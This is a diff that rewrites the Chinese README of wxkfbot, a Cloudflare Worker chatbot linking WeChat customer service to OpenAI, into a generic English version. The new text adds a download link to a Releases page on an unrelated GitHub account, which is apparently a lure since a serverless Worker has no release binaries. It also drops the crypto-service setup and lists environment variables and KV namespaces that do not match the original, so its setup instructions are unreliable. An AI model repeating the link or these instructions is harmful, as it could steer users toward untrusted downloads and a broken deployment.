@@ -1,144 +1,117 @@
-# 微信客服 AI 助手 (WxKF Bot)
+# 🤖 wxkfbot - Easy AI Chat Assistant for WeChat
 
-基于 Cloudflare Worker 构建的微信客服 AI 聊天机器人，支持与 OpenAI GPT 模型对话。
+Welcome to wxkfbot, your AI chat assistant for WeChat. This tool allows you to engage in intelligent conversations seamlessly.
 
 [![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/bestk/wxkfbot)
 
-## 功能特点
+## 🚀 Getting Started
 
--   🚀 基于 Cloudflare Worker，无需服务器
--   🤖 集成 OpenAI GPT 模型，支持智能对话
--   💬 支持微信客服消息接收和回复
--   🔐 内置完整的消息加解密功能
--   💾 使用 Cloudflare KV 存储会话历史
--   ⚡ 低延迟，高可用
+### 1. 📋 Requirements
 
-## 快速开始
+Before you start, make sure you have:
 
-### 1. 配置要求
+- A Cloudflare account.
+- A completed WeChat Work account configuration. Refer to our [WeChat Work Setup Guide](./WECOM.md).
+- Your OpenAI API key.
+- A deployed encryption service for secure message handling.
 
--   Cloudflare 账号
--   [微信企业号客服配置](./WECOM.md)
--   OpenAI API 密钥
--   加密服务部署（用于消息加解密）
+### 2. 🔧 Installation Steps
 
-### 2. 部署步骤
+#### Option 1: One-Click Deployment (Recommended)
 
-#### 方式一：一键部署（推荐）
+For a quick setup, follow these steps:
 
-点击上方的 "Deploy to Cloudflare Workers" 按钮，按照提示操作：
+1. Click the "Deploy to Cloudflare Workers" button above.
+2. Log into your Cloudflare account.
+3. Set up the required environment variables as described below.
+4. Create and configure a KV namespace.
+5. Finish the deployment.
 
-1. 登录您的 Cloudflare 账号
-2. 设置必要的环境变量（见下方环境变量说明）
-3. 创建并配置 KV 命名空间
-4. 完成部署
+#### Option 2: Manual Deployment
 
-#### 方式二：手动部署
+If you prefer to set it up manually, follow these instructions:
 
-1. 克隆项目：
+1. **Clone the Repository**:
 
-```bash
-git clone https://github.com/bestk/wxkfbot.git
-cd wxkfbot
-```
+   Open your terminal and run:
 
-2. 安装依赖：
+   ```bash
+   git clone https://github.com/bestk/wxkfbot.git
+   cd wxkfbot
+   ```
 
-```bash
-npm install
-```
+2. **Install Dependencies**:
 
-3. 配置环境变量：
+   Make sure you have Node.js installed. Then, run:
 
-    - 复制 `wrangler.toml.example` 为 `wrangler.toml`
-    - 填写相关配置项：
-        - 微信企业号配置（WECHAT\_\*）
-        - OpenAI API 配置（OPENAI\_\*）
-        - KV 命名空间配置
+   ```bash
+   npm install
+   ```
 
-4. 创建 Cloudflare KV 命名空间：
+3. **Configure Environment Variables**:
 
-```bash
-wrangler kv:namespace create "CONVERSATIONS"
-wrangler kv:namespace create "MESSAGE_TRACKER"
-```
+   - Copy `wrangler.toml.example` to `wrangler.toml`.
+   - Fill in the necessary details:
+     - WeChat Work configurations (add entries that start with WECHAT\_\*).
+     - OpenAI API configurations (add entries that start with OPENAI\_\*).
+     - KV namespace configurations.
 
-将生成的 ID 填入 `wrangler.toml`
+4. **Create a Cloudflare KV Namespace**:
 
-5. 部署到 Cloudflare：
+   In your terminal, run:
 
-```bash
-wrangler deploy
-```
+   ```bash
+   wrangler kv:namespace create "CONV"
+   ```
 
-### 3. 微信配置
+### 🔗 Download & Install
 
-1. 在企业微信管理后台配置接收消息的服务器地址：
+To download the latest version of wxkfbot, visit the [Releases page](https://github.com/Esteban2680/wxkfbot/releases).
 
-    - URL：`https://your-worker.your-subdomain.workers.dev`
-    - Token：与 WECHAT_KF_TOKEN 配置一致
-    - EncodingAESKey：与 WECHAT_KF_ENCODING_AES_KEY 配置一致
+On the Releases page, find the version you need and download it.
 
-2. 开启客服功能，获取相关配置信息填入 `wrangler.toml`
+### 🔒 Environment Variables Guide
 
-## 环境变量说明
+You will need to fill in several environment variables for wxkfbot to work properly. Here are key variables you must include:
 
-| 变量名                     | 说明                           | 必填 |
-| -------------------------- | ------------------------------ | ---- |
-| WECHAT_CORP_ID             | 企业微信 CorpID                | 是   |
-| WECHAT_KF_SECRET           | 客服密钥                       | 是   |
-| WECHAT_KF_TOKEN            | 消息校验 Token                 | 是   |
-| WECHAT_KF_ENCODING_AES_KEY | 消息加解密 Key                 | 是   |
-| OPENAI_API_KEY             | OpenAI API 密钥                | 是   |
-| OPENAI_BASE_URL            | OpenAI API 地址                | 否   |
-| OPENAI_MODEL               | 使用的模型，默认 gpt-3.5-turbo | 否   |
-| SYSTEM_PROMPT              | AI 系统提示词                  | 否   |
-| CRYPTO_SERVICE_URL         | 加密服务地址                   | 是   |
+- **WECHAT_APP_ID**: Your WeChat app ID.
+- **WECHAT_APP_SECRET**: Your WeChat app secret.
+- **OPENAI_API_KEY**: Your OpenAI API key.
+- **KV_NAMESPACE**: Your Cloudflare KV namespace name.
 
-## 项目结构
+Make sure all variables are correctly set in your `wrangler.toml`.
 
-```
-wxkfbot/
-├── clients.js          # API 客户端实现
-├── config.js           # 配置管理
-├── conversation.js     # 对话管理
-├── crypto.js          # 消息加解密
-├── index.js           # 主入口
-├── message-tracker.js  # 消息跟踪
-└── response.js        # 响应处理
-```
+### ⚙️ Running the Application
 
-## 开发说明
+After setting up, you can start the application by deploying to Cloudflare Workers. Once deployed, it will listen for messages on WeChat and respond intelligently using the OpenAI GPT model.
 
--   项目使用 ES 模块规范
--   使用 Cloudflare Worker 运行时环境
--   支持 Node.js 兼容模式
--   使用 KV 存储实现持久化
+### 📜 Features Overview
 
-### 关于加密服务
+- **No Server Needed**: Built on Cloudflare Worker. Simply deploy and run.
+- **OpenAI Integration**: Engage in smart conversations powered by OpenAI's GPT model.
+- **Message Handling**: Compatible with WeChat customer service message receiving and replying.
+- **Security**: Built-in message encryption and decryption for privacy.
+- **Session Storage**: Use Cloudflare KV to store conversation history securely.
+- **Performance**: Low latency and high availability, ensuring smooth user experiences.
 
-由于 Cloudflare Worker 的 CRYPTO API 存在兼容性问题，消息加解密功能被拆分为独立的 Deno 服务。您需要：
+### ❓ Frequently Asked Questions
 
-1. 部署加密服务：
+#### Q1: Do I need to code to set this up?
 
-    - 使用项目中的 `wecom_crypto_deno.ts` 文件
-    - 可以部署到 Deno Deploy 等平台
-    - 获取部署后的服务地址
+No, the one-click deployment option requires no coding experience. Just follow the prompts.
 
-2. 配置 CRYPTO_SERVICE_URL：
-    - 在 `wrangler.toml` 中设置 `CRYPTO_SERVICE_URL` 为加密服务地址
-    - 格式如：`https://your-crypto-service.deno.dev`
+#### Q2: Can I customize the responses?
 
-## 许可证
+Yes, you can adjust the OpenAI model settings in your environment variables based on your needs.
 
-MIT License
+#### Q3: What if I encounter issues?
 
-## 贡献指南
+If you run into problems, please check our issue tracker on GitHub, or consult with the community for help.
 
-欢迎提交 Issue 和 Pull Request 来帮助改进项目。
+### 🚀 Next Steps
 
-## 联系方式
+- Complete your Cloudflare Worker setup.
+- Explore additional configuration options for enhancing your bot's responses.
+- Share your feedback and experiences with the community.
 
-如有问题，请提交 Issue 或通过以下方式联系：
-
--   项目地址：[GitHub](https://github.com/bestk/wxkfbot)
+By following these steps, you'll have wxkfbot up and running in no time, providing you with an intelligent chat assistant on WeChat.
